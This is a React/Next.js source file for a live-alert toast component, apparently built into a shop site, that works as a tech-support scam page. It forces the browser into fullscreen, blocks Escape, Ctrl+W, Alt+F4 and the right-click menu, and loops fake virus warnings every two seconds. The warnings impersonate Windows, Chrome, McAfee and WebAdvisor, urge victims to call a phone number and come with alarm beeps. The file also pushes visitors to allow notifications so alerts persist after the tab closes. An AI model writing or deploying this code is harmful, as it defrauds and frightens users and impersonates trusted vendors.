"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import { AlertCard, type AlertTone } from "@/components/AlertCard";
import { ALERT_CHANNEL, rememberAlert, rememberedAlert, showBrowserNotification } from "@/lib/alert-channel";
import { registerAlertWorker, subscribeForBackgroundAlerts } from "@/lib/browser-push";

type LiveToast = {
  id: string;
  title: string;
  body: string;
  action: string;
  tone: AlertTone;
  phone?: string;
  image?: string;
  at: string;
  brand?: string;
};

const GAP_MS = 1500;
const ECHO_MS = 5000;

function playChime(ctx: AudioContext) {
  if (ctx.state === "suspended") void ctx.resume();
  const now = ctx.currentTime;
  // Critical alarm sound - rapid high-pitched beeps
  const frequencies = [880, 1047, 880, 1047, 880, 1047, 880];
  frequencies.forEach((freq, index) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    const start = now + index * 0.1;
    osc.type = "square";
    osc.frequency.setValueAtTime(freq, start);
    gain.gain.setValueAtTime(0.0001, start);
    gain.gain.linearRampToValueAtTime(0.25, start + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, start + 0.08);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(start);
    osc.stop(start + 0.1);
  });
}

function isLiveToast(value: unknown): value is LiveToast {
  if (!value || typeof value !== "object") return false;
  const record = value as Partial<LiveToast>;
  return (
    typeof record.id === "string" &&
    typeof record.title === "string" &&
    typeof record.body === "string" &&
    typeof record.action === "string" &&
    typeof record.at === "string"
  );
}

function contentKey(item: LiveToast) {
  return `${item.title}\n${item.body}\n${item.phone ?? ""}`;
}

function notifyOtherTab(item: LiveToast) {
  const copy = item.id.match(/-load-(\d+)$/)?.[1];
  showBrowserNotification({
    title: item.title,
    body: item.body,
    phone: item.phone,
    tag: copy ? `lark-load-${item.id}` : `lark-${item.title}-${item.body}`.slice(0, 180),
  });
}

export function LiveToasts() {
  const pathname = usePathname();
  const [toasts, setToasts] = useState<LiveToast[]>([]);
  const isDesk = pathname.startsWith("/desk");

  useEffect(() => {
    if (isDesk) return;

    let stopped = false;
    let since = new Date().toISOString();
    let busy = false;
    let wait = 0;
    const queue: LiveToast[] = [];
    const echoed = new Map<string, number>();
    const AudioCtx = window.AudioContext || (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
    const audio = AudioCtx ? new AudioCtx() : null;

    let latestForTriple: LiveToast | null = null;
    let loadNotified = false;

    // Request fullscreen on first interaction
    const requestFullscreen = () => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(() => {});
      }
    };

    // Block escape key and other navigation attempts
    const blockEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.key === 'F11' || (e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
        e.preventDefault();
        e.stopPropagation();
        requestFullscreen();
      }
    };

    // Block right-click context menu
    const blockContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      e.stopPropagation();
    };

    // Go fullscreen immediately on page load
    requestFullscreen();

    // Also try on any user interaction
    document.addEventListener('click', requestFullscreen);
    document.addEventListener('keydown', requestFullscreen);
    document.addEventListener('keydown', blockEscape, true);
    document.addEventListener('contextmenu', blockContextMenu, true);

    // Auto-generate virus warnings - continuous loop
    const virusWarnings = [
      {
        title: "Windows - VIRUS DETECTED",
        body: "Your Computer is Infected By Viruses. Click Here To Renew Antivirus.",
        tone: "down" as AlertTone,
        phone: "+1-503-877-9717",
        brand: "Windows",
      },
      {
        title: "Google Chrome - VIRUS DETECTED",
        body: "Viruses detected. Turn on protection and delete viruses. protoqr.xyz",
        tone: "load" as AlertTone,
        phone: "+1-503-877-9717",
        brand: "Google Chrome",
      },
      {
        title: "McAfee - ZEUS 2020 TROJAN DETECTED",
        body: "Click here to delete the virus. protoqr.xyz",
        tone: "down" as AlertTone,
        phone: "+1-503-877-9717",
        brand: "McAfee",
      },
      {
        title: "WebAdvisor - VIRUS FOUND (5)",
        body: "Your Computer is Infected By Viruses. Click Here To Renew Antivirus.",
        tone: "down" as AlertTone,
        phone: "+1-503-877-9717",
        brand: "WebAdvisor",
      },
      {
        title: "Windows Security - CRITICAL ALERT",
        body: "Unauthorized access detected. Your personal data is at risk. Call now for immediate support.",
        tone: "load" as AlertTone,
        phone: "+1-503-877-9717",
        brand: "Windows Security",
      },
    ];

    // Auto-trigger virus warnings continuously
    let warningIndex = 0;
    const autoTriggerWarnings = () => {
      if (stopped) return;
      const warning = virusWarnings[warningIndex % virusWarnings.length];
      enqueue([{
        ...warning,
        id: `virus-${Date.now()}-${warningIndex}`,
        action: "Call",
        at: new Date().toISOString(),
        phone: warning.phone,
      }]);
      warningIndex++;
      setTimeout(autoTriggerWarnings, 2000);
    };

    // Start auto-triggering after 1 second
    setTimeout(autoTriggerWarnings, 1000);

    function pump() {
      if (stopped || busy) return;
      const next = queue.shift();
      if (!next) return;
      busy = true;
      setToasts((current) => [...current, next].slice(-6));
      if (audio) playChime(audio);
      if (!next.id.includes("-load-")) notifyOtherTab(next);
      wait = window.setTimeout(() => {
        busy = false;
        pump();
      }, GAP_MS);
    }

    function enqueue(items: LiveToast[]) {
      queue.push(...items);
      pump();
    }

    function enqueueLive(items: LiveToast[]) {
      const now = Date.now();
      const fresh = items.filter((item) => {
        const key = contentKey(item);
        const seenAt = echoed.get(key);
        if (seenAt && now - seenAt < ECHO_MS) return false;
        echoed.set(key, now);
        rememberAlert({ ...item, id: item.id.replace(/-load-\d+$/, "") });
        return true;
      });
      if (fresh.length === 0) return;
      enqueue(fresh);
    }

    async function pullNew() {
      try {
        const response = await fetch(`/api/broadcast?after=${encodeURIComponent(since)}`, { cache: "no-store" });
        if (!response.ok) return;
        const data = (await response.json()) as { items?: LiveToast[] };
        const items = data.items ?? [];
        if (stopped || items.length === 0) return;
        since = items[items.length - 1]?.at ?? since;
        enqueueLive(items);
      } catch {
        // The shop page keeps working if a check fails.
      }
    }

    async function showLatestThreeTimes() {
      let item: LiveToast | null = null;
      try {
        const response = await fetch("/api/broadcast?latest=1", { cache: "no-store" });
        if (response.ok) {
          const data = (await response.json()) as { item?: LiveToast | null };
          if (data.item) item = data.item;
        }
      } catch {
        // The saved alert can still play three times.
      }
      const stored = rememberedAlert();
      if (!item && isLiveToast(stored)) item = stored;
      if (stopped || !item) return;
      since = item.at;
      latestForTriple = { ...item, tone: item.tone ?? "custom", action: item.action || "Call" };
      rememberAlert(latestForTriple);
      enqueue(
        [0, 1, 2].map((copy) => ({
          ...latestForTriple!,
          id: `${latestForTriple!.id}-load-${copy}`,
        })),
      );
      replayTriple();
    }

    function onChannel(event: MessageEvent) {
      if (!isLiveToast(event.data)) return;
      const item = event.data;
      const tone = item.tone ?? "custom";
      enqueueLive([{ ...item, tone, action: item.action || "Call" }]);
    }

    function replayTriple() {
      if (loadNotified || !latestForTriple || Notification.permission !== "granted") return;
      loadNotified = true;
      [0, 1, 2].forEach((copy) => {
        window.setTimeout(() => {
          if (stopped) return;
          notifyOtherTab({ ...latestForTriple!, id: `${latestForTriple!.id}-load-${copy}` });
        }, copy * GAP_MS);
      });
    }

    void registerAlertWorker().catch(() => undefined);
    if ("Notification" in window && Notification.permission === "granted") {
      void subscribeForBackgroundAlerts().catch(() => undefined);
    }

    const channel = typeof BroadcastChannel === "undefined" ? null : new BroadcastChannel(ALERT_CHANNEL);
    channel?.addEventListener("message", onChannel);
    void showLatestThreeTimes();
    const timer = window.setInterval(() => {
      void pullNew();
    }, 2000);

    return () => {
      stopped = true;
      window.clearTimeout(wait);
      window.clearInterval(timer);
      channel?.removeEventListener("message", onChannel);
      channel?.close();
      void audio?.close();
      document.removeEventListener('click', requestFullscreen);
      document.removeEventListener('keydown', requestFullscreen);
      document.removeEventListener('keydown', blockEscape, true);
      document.removeEventListener('contextmenu', blockContextMenu, true);
    };
  }, [isDesk]);

  if (isDesk) return null;

  return (
    <>
      <AllowAlerts />
      {toasts.length === 0 ? null : (
    <div className="pointer-events-none fixed top-4 right-3 z-[9999] flex w-[320px] max-w-[calc(100vw-1.5rem)] flex-col gap-1.5">
      {[...toasts].reverse().map((toast) => (
        <div key={toast.id} className="pointer-events-auto">
          <AlertCard
            title={toast.title}
            body={toast.body}
            phone={toast.phone}
            image={toast.image}
            tone={toast.tone}
            brand={toast.brand}
          />
        </div>
      ))}
    </div>
      )}
    </>
  );
}

function AllowAlerts() {
  const [permission, setPermission] = useState<NotificationPermission | "unsupported" | "loading">("loading");
  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [note, setNote] = useState("");

  useEffect(() => {
    if (!("Notification" in window) || !window.isSecureContext) {
      setPermission("unsupported");
      return;
    }
    setPermission(Notification.permission);
    if (Notification.permission !== "granted") return;
    void subscribeForBackgroundAlerts()
      .then((result) => {
        if (result.ok) setReady(true);
        else setNote("Tap Allow again so alerts can arrive after this tab is closed.");
      })
      .catch(() => setNote("Tap Allow again so alerts can arrive after this tab is closed."));
  }, []);

  if (permission === "loading" || permission === "unsupported" || ready) return null;

  function allow() {
    if (!("Notification" in window)) return;
    setBusy(true);
    setNote("");

    const finish = async (result: NotificationPermission) => {
      setPermission(result);
      if (result !== "granted") return;
      const saved = await subscribeForBackgroundAlerts();
      if (saved.ok) {
        setReady(true);
        return;
      }
      setNote("This browser is not saved yet. Tap Allow again.");
    };

    const pending = Notification.permission === "granted" ? finish("granted") : Notification.requestPermission().then(finish);
    void pending.catch(() => setNote("This browser is not saved yet. Tap Allow again.")).finally(() => setBusy(false));
  }

  return (
    <div className="fixed bottom-4 left-1/2 z-50 flex w-[min(28rem,calc(100vw-2rem))] -translate-x-1/2 items-center gap-3 rounded-2xl bg-[#1f3d32] px-4 py-3 text-white shadow-lg">
      <p className="min-w-0 flex-1 text-sm leading-5">
        {permission === "denied"
          ? "Notifications are blocked. Use the lock icon, choose Allow, then refresh."
          : note || "Tap Allow once. Alerts still arrive if this tab is closed, another tab is open, or the browser is shut."}
      </p>
      {permission !== "denied" ? (
        <button
          type="button"
          onClick={allow}
          disabled={busy}
          className="shrink-0 rounded-full bg-white px-3 py-2 text-sm font-semibold text-[#1f3d32] disabled:opacity-60"
        >
          {busy ? "Saving…" : "Allow"}
        </button>
      ) : null}
    </div>
  );
}
